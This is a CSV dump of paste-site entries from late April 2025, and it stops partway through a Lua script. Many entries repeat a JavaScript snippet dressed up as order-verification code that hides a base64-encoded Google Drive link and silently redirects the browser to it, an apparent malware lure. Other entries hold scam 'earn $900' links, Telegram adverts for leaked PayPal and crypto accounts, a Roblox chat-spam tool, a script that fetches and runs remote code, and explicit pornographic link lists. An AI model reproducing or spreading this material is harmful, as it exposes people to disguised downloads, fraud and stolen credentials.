id,title,username,language,date,content
jxynuR1e,EARN $900 INSTANTLY 2025‚≠ê GV,loukascameron,JavaScript,Tuesday 29th of April 2025 01:02:54 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Ld5MxBDNzS
"
gijUrF5u,Products.js,WantingTrae,JavaScript,Tuesday 29th of April 2025 12:58:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58708/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rkSXW5U4,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Tuesday 29th of April 2025 12:55:10 AM CDT,14197 Accounts Posted On https://t.me/leakzbyeminem
2WdC3MgB,Make $1000 15-MINUTES  (BEGINNER) YR,loukascameron,JavaScript,Tuesday 29th of April 2025 12:53:39 AM CDT," 
Pdf https://tinyurl.com/freshleaks

5GBDr3EKjI
"
4GAh7MV7,EARN $900 INSTANTLY 2025 95,loukascameron,JavaScript,Tuesday 29th of April 2025 12:44:22 AM CDT," 
Pdf https://tinyurl.com/freshleaks

BGQO1iH9wZ
"
0MZwfExC,Strongest battleground Fps Boost,SuperDupedGems,Lua,Tuesday 29th of April 2025 12:43:44 AM CDT,"Remove_Grass = true
Remove_Trees = true
Remove_Walls = true
loadstring(game:HttpGet(""https://raw.githubusercontent.com/louismich4el/ItsLouisPlayz-Scripts/refs/heads/main/Anti%20Lag%20V2.lua""))()"
Aiu7ri3M,Order.js,WantingTrae,JavaScript,Tuesday 29th of April 2025 12:42:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09949/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AXjXcBAe,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Tuesday 29th of April 2025 12:39:48 AM CDT,24857 Accounts Posted On https://t.me/leakzbyeminem
tTHQ1awb,Make $1000 15-MINUTES (BEGINNER) L4,loukascameron,JavaScript,Tuesday 29th of April 2025 12:35:08 AM CDT," 
Pdf https://tinyurl.com/freshleaks

417CPnkuos
"
rHjEBYQt,Market.js,WantingTrae,JavaScript,Tuesday 29th of April 2025 12:27:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08645/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Dq5temZX,EARN $900 INSTANTLY 2025‚≠ê GV,loukascameron,JavaScript,Tuesday 29th of April 2025 12:25:52 AM CDT," 
Pdf https://tinyurl.com/freshleaks

7c0G6DH7Ro
"
TEuupTka,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Tuesday 29th of April 2025 12:24:08 AM CDT,01369 Accounts Posted On https://t.me/leakzbyeminem
2GkRYrCK,Make $1000 15-MINUTES  (BEGINNER) YR,loukascameron,JavaScript,Tuesday 29th of April 2025 12:16:39 AM CDT," 
Pdf https://tinyurl.com/freshleaks

3pr6hmwsQK
"
Xx6JTgZK,Roblox Spam Chat Script,Steamhesaproblox,RBScript,Tuesday 29th of April 2025 12:15:21 AM CDT,"local TweenService = game:GetService(""TweenService"")
local Player = game:GetService(""Players"").LocalPlayer
local UserInputService = game:GetService(""UserInputService"")

local ScreenGui = Instance.new(""ScreenGui"", game.CoreGui)
ScreenGui.Name = ""ChatSpamGui""

local Frame = Instance.new(""Frame"", ScreenGui)
Frame.Name = ""Main""
Frame.AnchorPoint = Vector2.new(0,0)
Frame.Position = UDim2.new(0.1,0,0.1,0)
Frame.Size = UDim2.new(0,250,0,220)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Visible = false

local UICorner = Instance.new(""UICorner"", Frame)
UICorner.CornerRadius = UDim.new(0,8)

local UIStroke = Instance.new(""UIStroke"", Frame)
UIStroke.Thickness = 2
UIStroke.Color = Color3.new(1, 1, 1)

local Title = Instance.new(""TextLabel"", Frame)
Title.Size = UDim2.new(1,0,0,30)
Title.BackgroundTransparency = 1
Title.Text = ""üí¨ Chat Spam üí¨""
Title.TextColor3 = Color3.new(1,1,1)
Title.TextScaled = true
Title.Font = Enum.Font.Gotham

local Box = Instance.new(""TextBox"", Frame)
Box.Position = UDim2.new(0.05,0,0.3,0)
Box.Size = UDim2.new(0.9,0,0.2,0)
Box.PlaceholderText = ""Type your message...""
Box.Text = """"
Box.TextScaled = true
Box.TextColor3 = Color3.new(1, 1, 1)
Box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
local BoxCorner = Instance.new(""UICorner"", Box)
BoxCorner.CornerRadius = UDim.new(0,5)

local Button = Instance.new(""TextButton"", Frame)
Button.Position = UDim2.new(0.05,0,0.6,0)
Button.Size = UDim2.new(0.9,0,0.2,0)
Button.Text = ""Enable Spam""
Button.TextScaled = true
Button.Font = Enum.Font.Gotham
Button.TextColor3 = Color3.new(1, 1, 1)
Button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
local ButtonCorner = Instance.new(""UICorner"", Button)
ButtonCorner.CornerRadius = UDim.new(0,5)

local ToggleButton = Instance.new(""TextButton"", ScreenGui)
ToggleButton.Position = UDim2.new(0,10,0,10)
ToggleButton.Size = UDim2.new(0,50,0,50)
ToggleButton.Text = ""‚ò∞""
ToggleButton.TextScaled = true
ToggleButton.Font = Enum.Font.Gotham
ToggleButton.TextColor3 = Color3.new(1,1,1)
ToggleButton.BackgroundColor3 = Color3.fromRGB(40,40,40)
local ToggleCorner = Instance.new(""UICorner"", ToggleButton)
ToggleCorner.CornerRadius = UDim.new(0,8)

local dragging = false
local dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

Frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = Frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
		update(input)
	end
end)

local active = false
local message = """"

Box.FocusLost:Connect(function()
	message = Box.Text
end)

Button.MouseButton1Click:Connect(function()
	active = not active
	Button.Text = active and ""Disable Spam"" or ""Enable Spam""
end)

ToggleButton.MouseButton1Click:Connect(function()
	Frame.Visible = not Frame.Visible
end)

while true do
	wait(0.5)
	if active and message ~= """" then
		pcall(function()
			game:GetService(""TextChatService"").TextChannels.RBXGeneral:SendAsync(message)
		end)
	end
end
"
2YYH06Bv,Untitled,WantingTrae,JavaScript,Tuesday 29th of April 2025 12:11:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WZF0ELrK,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Tuesday 29th of April 2025 12:08:40 AM CDT,95454 Accounts Posted On https://t.me/leakzbyeminem
cpn1QRvn,EARN $900 INSTANTLY 2025 95,loukascameron,JavaScript,Tuesday 29th of April 2025 12:07:27 AM CDT," 
Pdf https://tinyurl.com/freshleaks

utTOUH2whd
"
jNgEm2Yk,Untitled,Blazuno,Lua,Monday 28th of April 2025 11:58:43 PM CDT,"local switch = false 

local function system()
    if switch then
        turtle.dropDown(1)
        sleep(11)
        switch = false 
    else 
        turtle.drop(1)
        sleep(2)
        switch = true 
    end
end 

system()"
w2ULHjHA,Market.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 11:56:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ku8P8if8,Mens only (Apr 29 2025),MarcSpencer,HTML,Monday 28th of April 2025 11:53:53 PM CDT,"Zack Lamattraque submits to Marcus McNeill
<a href=""https://fappic.com/z1gyfaecw95p/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-001.jpg""><img src=""https://img103.fappic.com/i/03921/z1gyfaecw95p_t.jpg""></a><a href=""https://fappic.com/w6z2crbp9ot8/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-002.jpg""><img src=""https://img103.fappic.com/i/03921/w6z2crbp9ot8_t.jpg""></a><a href=""https://fappic.com/hpraooalc7v5/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-003.jpg""><img src=""https://img103.fappic.com/i/03921/hpraooalc7v5_t.jpg""></a><a href=""https://fappic.com/rnch3s40n8hb/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-004.jpg""><img src=""https://img103.fappic.com/i/03921/rnch3s40n8hb_t.jpg""></a><a href=""https://fappic.com/zx3yef5kyrx5/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-005.jpg""><img src=""https://img103.fappic.com/i/03921/zx3yef5kyrx5_t.jpg""></a><a href=""https://fappic.com/k4wqnxmfp7yl/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-006.jpg""><img src=""https://img103.fappic.com/i/03921/k4wqnxmfp7yl_t.jpg""></a><a href=""https://fappic.com/u9aew43w46pe/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-007.jpg""><img src=""https://img103.fappic.com/i/03921/u9aew43w46pe_t.jpg""></a><a href=""https://fappic.com/kqzhzbytncps/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-008.jpg""><img src=""https://img103.fappic.com/i/03921/kqzhzbytncps_t.jpg""></a><a href=""https://fappic.com/ds4pmgnc9a75/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-009.jpg""><img src=""https://img103.fappic.com/i/03921/ds4pmgnc9a75_t.jpg""></a><a href=""https://fappic.com/brj01ws7rk71/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-010.jpg""><img src=""https://img103.fappic.com/i/03921/brj01ws7rk71_t.jpg""></a><a href=""https://fappic.com/xefe6wbxj65c/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-011.jpg""><img src=""https://img103.fappic.com/i/03921/xefe6wbxj65c_t.jpg""></a><a href=""https://fappic.com/oo03c2kkc077/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-012.jpg""><img src=""https://img103.fappic.com/i/03921/oo03c2kkc077_t.jpg""></a><a href=""https://fappic.com/dqinfzznho0y/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-013.jpg""><img src=""https://img103.fappic.com/i/03921/dqinfzznho0y_t.jpg""></a><a href=""https://fappic.com/085j47i7muwq/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-014.jpg""><img src=""https://img103.fappic.com/i/03921/085j47i7muwq_t.jpg""></a><a href=""https://fappic.com/s3e0t2c414ob/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-015.jpg""><img src=""https://img103.fappic.com/i/03921/s3e0t2c414ob_t.jpg""></a><a href=""https://fappic.com/3117qd208y8j/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-016.jpg""><img src=""https://img103.fappic.com/i/03921/3117qd208y8j_t.jpg""></a><a href=""https://fappic.com/y2tyz0l01si9/the-bro_work-zack-lamattraque-submits-to-marcus-mcneill-017.jpg""><img src=""https://img103.fappic.com/i/03921/y2tyz0l01si9_t.jpg""></a>

JJ Knight and Jack Hunter on the trail 
<a href=""https://fappic.com/94dzbjfxxunz/787075.jpg""><img src=""https://img103.fappic.com/i/03921/94dzbjfxxunz_t.jpg""></a><a href=""https://fappic.com/wxb54h7m16ry/787076.jpg""><img src=""https://img103.fappic.com/i/03921/wxb54h7m16ry_t.jpg""></a><a href=""https://fappic.com/22bolqc4burg/787077.jpg""><img src=""https://img103.fappic.com/i/03921/22bolqc4burg_t.jpg""></a><a href=""https://fappic.com/ijs6r5o967n6/787078.jpg""><img src=""https://img103.fappic.com/i/03921/ijs6r5o967n6_t.jpg""></a><a href=""https://fappic.com/rqgx1cc58r9j/787079.jpg""><img src=""https://img103.fappic.com/i/03921/rqgx1cc58r9j_t.jpg""></a><a href=""https://fappic.com/oh70ree5kv67/787080.jpg""><img src=""https://img103.fappic.com/i/03921/oh70ree5kv67_t.jpg""></a><a href=""https://fappic.com/xkds3rp8n65v/787081.jpg""><img src=""https://img103.fappic.com/i/03921/xkds3rp8n65v_t.jpg""></a><a href=""https://fappic.com/p03it5vjg2cj/787082.jpg""><img src=""https://img103.fappic.com/i/03921/p03it5vjg2cj_t.jpg""></a><a href=""https://fappic.com/1q9xe65fvmoe/787083.jpg""><img src=""https://img103.fappic.com/i/03921/1q9xe65fvmoe_t.jpg""></a><a href=""https://fappic.com/d5n1w1zr43dy/787084.jpg""><img src=""https://img103.fappic.com/i/03921/d5n1w1zr43dy_t.jpg""></a><a href=""https://fappic.com/9qwx6gdrzcq9/787085.jpg""><img src=""https://img103.fappic.com/i/03921/9qwx6gdrzcq9_t.jpg""></a><a href=""https://fappic.com/rks90f2t6nf4/787086.jpg""><img src=""https://img103.fappic.com/i/03921/rks90f2t6nf4_t.jpg""></a><a href=""https://fappic.com/ujn4iolo2v1b/787087.jpg""><img src=""https://img103.fappic.com/i/03921/ujn4iolo2v1b_t.jpg""></a><a href=""https://fappic.com/de3o4rsbx1sr/787088.jpg""><img src=""https://img103.fappic.com/i/03921/de3o4rsbx1sr_t.jpg""></a><a href=""https://fappic.com/d3dvwbaf8oce/787089.jpg""><img src=""https://img103.fappic.com/i/03921/d3dvwbaf8oce_t.jpg""></a>

Jay Stryker rims Flynn Fenix 
<a href=""https://fappic.com/tcxsb1l1nt7j/788853.jpg""><img src=""https://img103.fappic.com/i/03921/tcxsb1l1nt7j_t.jpg""></a><a href=""https://fappic.com/o8adb3v7cukq/788854.jpg""><img src=""https://img103.fappic.com/i/03921/o8adb3v7cukq_t.jpg""></a><a href=""https://fappic.com/4e04ngs0w75b/788855.jpg""><img src=""https://img103.fappic.com/i/03921/4e04ngs0w75b_t.jpg""></a><a href=""https://fappic.com/zoncwvkpx3y8/788856.jpg""><img src=""https://img103.fappic.com/i/03921/zoncwvkpx3y8_t.jpg""></a><a href=""https://fappic.com/vn63df8woxfy/788857.jpg""><img src=""https://img103.fappic.com/i/03921/vn63df8woxfy_t.jpg""></a><a href=""https://fappic.com/ss46d7u64wk2/788858.jpg""><img src=""https://img103.fappic.com/i/03921/ss46d7u64wk2_t.jpg""></a><a href=""https://fappic.com/11lsm7qf630r/788859.jpg""><img src=""https://img103.fappic.com/i/03921/11lsm7qf630r_t.jpg""></a><a href=""https://fappic.com/p8lyvpeovbzn/788860.jpg""><img src=""https://img103.fappic.com/i/03921/p8lyvpeovbzn_t.jpg""></a><a href=""https://fappic.com/xkcsk8ud7fir/788861.jpg""><img src=""https://img103.fappic.com/i/03921/xkcsk8ud7fir_t.jpg""></a><a href=""https://fappic.com/pispl92t9hib/788862.jpg""><img src=""https://img103.fappic.com/i/03921/pispl92t9hib_t.jpg""></a><a href=""https://fappic.com/t4b706s57pdd/788863.jpg""><img src=""https://img103.fappic.com/i/03921/t4b706s57pdd_t.jpg""></a><a href=""https://fappic.com/spiwx6abhglz/788864.jpg""><img src=""https://img103.fappic.com/i/03921/spiwx6abhglz_t.jpg""></a><a href=""https://fappic.com/f0k4hrg7vu14/788865.jpg""><img src=""https://img103.fappic.com/i/03921/f0k4hrg7vu14_t.jpg""></a><a href=""https://fappic.com/3857hw2sw3qp/788866.jpg""><img src=""https://img103.fappic.com/i/03921/3857hw2sw3qp_t.jpg""></a><a href=""https://fappic.com/2qrdns7lex0o/788867.jpg""><img src=""https://img103.fappic.com/i/03921/2qrdns7lex0o_t.jpg""></a><a href=""https://fappic.com/adnj2hmrg5ut/788868.jpg""><img src=""https://img103.fappic.com/i/03921/adnj2hmrg5ut_t.jpg""></a><a href=""https://fappic.com/0kq98lurofy8/788869.jpg""><img src=""https://img103.fappic.com/i/03921/0kq98lurofy8_t.jpg""></a><a href=""https://fappic.com/7ow7vdwm9f3a/788870.jpg""><img src=""https://img103.fappic.com/i/03921/7ow7vdwm9f3a_t.jpg""></a><a href=""https://fappic.com/j8owszfkh7qg/788871.jpg""><img src=""https://img103.fappic.com/i/03921/j8owszfkh7qg_t.jpg""></a><a href=""https://fappic.com/059bf23747i1/788872.jpg""><img src=""https://img103.fappic.com/i/03921/059bf23747i1_t.jpg""></a>

JD and Kyle Bailee
<a href=""https://fappic.com/8p1f2jjwxdn0/788098.jpg""><img src=""https://img103.fappic.com/i/03921/8p1f2jjwxdn0_t.jpg""></a><a href=""https://fappic.com/1jeq5866c334/788099.jpg""><img src=""https://img103.fappic.com/i/03921/1jeq5866c334_t.jpg""></a><a href=""https://fappic.com/qyna7hqlgba6/788100.jpg""><img src=""https://img103.fappic.com/i/03921/qyna7hqlgba6_t.jpg""></a><a href=""https://fappic.com/ll4abtrrdpau/788101.jpg""><img src=""https://img103.fappic.com/i/03921/ll4abtrrdpau_t.jpg""></a><a href=""https://fappic.com/xmc5fr9xrl98/788102.jpg""><img src=""https://img103.fappic.com/i/03921/xmc5fr9xrl98_t.jpg""></a><a href=""https://fappic.com/n382sy6xyrwz/788103.jpg""><img src=""https://img103.fappic.com/i/03921/n382sy6xyrwz_t.jpg""></a><a href=""https://fappic.com/syh13yd1f53n/788104.jpg""><img src=""https://img103.fappic.com/i/03921/syh13yd1f53n_t.jpg""></a><a href=""https://fappic.com/f34gsnydj5ep/788105.jpg""><img src=""https://img103.fappic.com/i/03921/f34gsnydj5ep_t.jpg""></a><a href=""https://fappic.com/97zzb1gk2iu7/788106.jpg""><img src=""https://img103.fappic.com/i/03921/97zzb1gk2iu7_t.jpg""></a><a href=""https://fappic.com/4ywl25t1801d/788107.jpg""><img src=""https://img103.fappic.com/i/03921/4ywl25t1801d_t.jpg""></a><a href=""https://fappic.com/h2hphtoya6yk/788108.jpg""><img src=""https://img103.fappic.com/i/03921/h2hphtoya6yk_t.jpg""></a><a href=""https://fappic.com/i0r2gb1eagqz/788109.jpg""><img src=""https://img103.fappic.com/i/03921/i0r2gb1eagqz_t.jpg""></a><a href=""https://fappic.com/tava6jevieo4/788110.jpg""><img src=""https://img103.fappic.com/i/03921/tava6jevieo4_t.jpg""></a><a href=""https://fappic.com/anxpd3jpcwpx/788111.jpg""><img src=""https://img103.fappic.com/i/03921/anxpd3jpcwpx_t.jpg""></a><a href=""https://fappic.com/6ws11cn4lk6h/788112.jpg""><img src=""https://img103.fappic.com/i/03921/6ws11cn4lk6h_t.jpg""></a><a href=""https://fappic.com/ykrj1zung317/788113.jpg""><img src=""https://img103.fappic.com/i/03921/ykrj1zung317_t.jpg""></a><a href=""https://fappic.com/l2glg6i5cqbr/788114.jpg""><img src=""https://img103.fappic.com/i/03921/l2glg6i5cqbr_t.jpg""></a><a href=""https://fappic.com/zwrp30t1f6or/788115.jpg""><img src=""https://img103.fappic.com/i/03921/zwrp30t1f6or_t.jpg""></a><a href=""https://fappic.com/iohjf6dugtcw/788116.jpg""><img src=""https://img103.fappic.com/i/03921/iohjf6dugtcw_t.jpg""></a><a href=""https://fappic.com/l6d5aejqi54q/788117.jpg""><img src=""https://img103.fappic.com/i/03921/l6d5aejqi54q_t.jpg""></a>

Greg Dixxon and Brody Meyer 
<a href=""https://u-77sr0mea0t.urlcash.net""><img src=""https://img103.fappic.com/i/03921/9gscws3we22n_t.jpg""></a><a href=""https://u-47sr0mfcey.urlcash.net""><img src=""https://img103.fappic.com/i/03921/z3bw7heo9pgy_t.jpg""></a><a href=""https://u-57sr0mg6ps.urlcash.net""><img src=""https://img103.fappic.com/i/03921/jklcqb9dybej_t.jpg""></a><a href=""https://u-x7sr0mhk5l.urlcash.net""><img src=""https://img103.fappic.com/i/03921/mhtdchkclqgr_t.jpg""></a><a href=""https://u-f7sr0miot5.urlcash.net""><img src=""https://img103.fappic.com/i/03921/xlcovc2zmn2x_t.jpg""></a><a href=""https://u-u7sr0m0raj.urlcash.net""><img src=""https://img103.fappic.com/i/03921/n5qgd8j71oco_t.jpg""></a><a href=""https://u-17sr0m1k7j.urlcash.net""><img src=""https://img103.fappic.com/i/03921/7z6l6yravwyk_t.jpg""></a><a href=""https://u-o7sr0m21ye.urlcash.net""><img src=""https://img103.fappic.com/i/03921/90xzf2ozcxck_t.jpg""></a><a href=""https://u-l7sr0m3ytj.urlcash.net""><img src=""https://img103.fappic.com/i/03921/h5osbimjuqhc_t.jpg""></a><a href=""https://u-57sr0m4z3m.urlcash.net""><img src=""https://img103.fappic.com/i/03921/7ypyiobbjskf_t.jpg""></a><a href=""https://u-d7sr0m5ut4.urlcash.net""><img src=""https://img103.fappic.com/i/03921/ot7ykl2o52vh_t.jpg""></a><a href=""https://u-67sr0m6vkh.urlcash.net""><img src=""https://img103.fappic.com/i/03921/g92tc3ky6duh_t.jpg""></a><a href=""https://u-47sr0m7i0k.urlcash.net""><img src=""https://img103.fappic.com/i/03921/w569ivdylj0d_t.jpg""></a><a href=""https://u-x7sr0m8el6.urlcash.net""><img src=""https://img103.fappic.com/i/03921/mz2xahkassw4_t.jpg""></a><a href=""https://u-67sr0m9n3d.urlcash.net""><img src=""https://img103.fappic.com/i/03921/3x5emiegd22d_t.jpg""></a>
"
XGSuvV9p,Crypto Accounts,kammex,JavaScript,Monday 28th of April 2025 11:53:15 PM CDT,22457 Accounts Posted On https://t.me/leakzbyeminem
6KXftrU6,Untitled,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 11:41:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93383/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rztMq1jk,PayPal with Balance,kammex,JavaScript,Monday 28th of April 2025 11:37:54 PM CDT,79751 Accounts Posted On https://t.me/leakzbyeminem
YV3J1dtD,Products.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 11:25:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87487/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mfqr7UVB,Leaked Accounts - Fresh Hits,kammex,JavaScript,Monday 28th of April 2025 11:22:32 PM CDT,83793 Accounts Posted On https://t.me/leakzbyeminem
KVEb0Uz4,Hohami,suramraja1,Lua,Monday 28th of April 2025 11:18:06 PM CDT,"--BGSI New


if not game:IsLoaded() then
    game.Loaded:wait()
end

task.wait(10)

--[[setfpscap(55)
print(""FPS CAP 15"")]]--

-- Run a single check for 100M Egg availability
spawn(function()
    local success, result = pcall(function()
        -- Wait a bit to ensure the game is fully loaded
        task.wait(60)
        
        -- Check if the Generic folder exists
        if workspace:FindFirstChild(""Rendered"") and workspace.Rendered:FindFirstChild(""Generic"") then
            -- Check if 100M Egg exists directly
            if workspace.Rendered.Generic:FindFirstChild(""100M Egg"") then
                return true -- Egg found
            else
                -- Iterate through all children of Generic to find 100M Egg
                for i, v in pairs(workspace.Rendered.Generic:GetChildren()) do
                    if v.Name == ""100M Egg"" then
                        return true -- Egg found
                    end
                end
            end
        end
        
        -- If we reach here, egg was not found
